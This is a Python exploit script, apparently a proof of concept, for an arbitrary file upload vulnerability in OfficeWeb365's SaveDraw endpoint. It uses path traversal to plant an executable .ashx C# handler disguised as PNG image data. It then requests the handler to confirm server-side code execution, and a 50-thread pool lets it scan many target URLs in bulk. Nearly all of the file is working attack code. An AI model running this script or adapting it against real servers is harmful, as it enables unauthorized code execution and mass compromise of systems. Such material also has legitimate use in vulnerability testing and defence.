#OfficeWeb365 SaveDraw 任意文件上传漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """


 ██████╗ ███████╗███████╗██╗ ██████╗███████╗██╗    ██╗███████╗██████╗ ██████╗  ██████╗ ███████╗      ███████╗ █████╗ ██╗   ██╗███████╗██████╗ ██████╗  █████╗ ██╗    ██╗    
██╔═══██╗██╔════╝██╔════╝██║██╔════╝██╔════╝██║    ██║██╔════╝██╔══██╗╚════██╗██╔════╝ ██╔════╝      ██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██║    ██║    
██║   ██║█████╗  █████╗  ██║██║     █████╗  ██║ █╗ ██║█████╗  ██████╔╝ █████╔╝███████╗ ███████╗█████╗███████╗███████║██║   ██║█████╗  ██║  ██║██████╔╝███████║██║ █╗ ██║    
██║   ██║██╔══╝  ██╔══╝  ██║██║     ██╔══╝  ██║███╗██║██╔══╝  ██╔══██╗ ╚═══██╗██╔═══██╗╚════██║╚════╝╚════██║██╔══██║╚██╗ ██╔╝██╔══╝  ██║  ██║██╔══██╗██╔══██║██║███╗██║    
╚██████╔╝██║     ██║     ██║╚██████╗███████╗╚███╔███╔╝███████╗██████╔╝██████╔╝╚██████╔╝███████║      ███████║██║  ██║ ╚████╔╝ ███████╗██████╔╝██║  ██║██║  ██║╚███╔███╔╝    
 ╚═════╝ ╚═╝     ╚═╝     ╚═╝ ╚═════╝╚══════╝ ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝     
                                                                                                                                                                            
                                                     author:zm
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="This is OfficeWeb365 SaveDraw arbitrary file upload vulnerability")
    parser.add_argument('-u','-url',dest='url',type=str,help="Please input your URL")
    parser.add_argument('-f','-file',dest='file',type=str,help="Please input your File path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = "/PW/SaveDraw?path=../../Content/img&idx=12.ashx"
    headers = {     
        'User-Agent':'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36',
        'Content-Type':'application/x-www-form-urlencoded',
    }
    data = (
        'data:image/png;base64,{{filehash}}<%@ Language="C#" Class="Handler1" %>public class\r\n'
        'Handler1:System.Web.IHttpHandler\r\n'
        '{\r\n'
        'public void ProcessRequest(System.Web.HttpContext context)\r\n'
        '{\r\n'
        'System.Web.HttpResponse response = context.Response;\r\n'
        'response.Write(44 * 41);\r\n'
        '\r\n'
        'string filePath = context.Server.MapPath("/") + context.Request.Path;\r\n'
        'if (System.IO.File.Exists(filePath))\r\n'
        '{\r\n'
        'System.IO.File.Delete(filePath);\r\n'
        '}\r\n'
        '}\r\n'
        'public bool IsReusable\r\n'
        '{\r\n'
        'get { return false; }\r\n'
        '}\r\n'
        '}///---\r\n\r\n'
    )
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        if res1.status_code == 200 and 'ok' in res1.text:
            payload1 = "/Content/img/UserDraw/drawPW12.ashx"
            headers1 = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36',
            }
            res2 = requests.get(url=target+payload1,headers=headers1,verify=False,timeout=5)
            if res2.status_code == 200 and "1804" in res2.text:
                print(f"[+]{target} have loophole “{target+payload}”")
                with open ('result.txt','a',encoding='utf-8') as f:
                    f.write(target+'\n')
            else:
                print(f"[-]{target} have loophole")
        else:
                print(f"[-]{target} have loophole")
    except Exception as e:
        print(f"Exception occurred: {e}")
if __name__ == "__main__":
    main()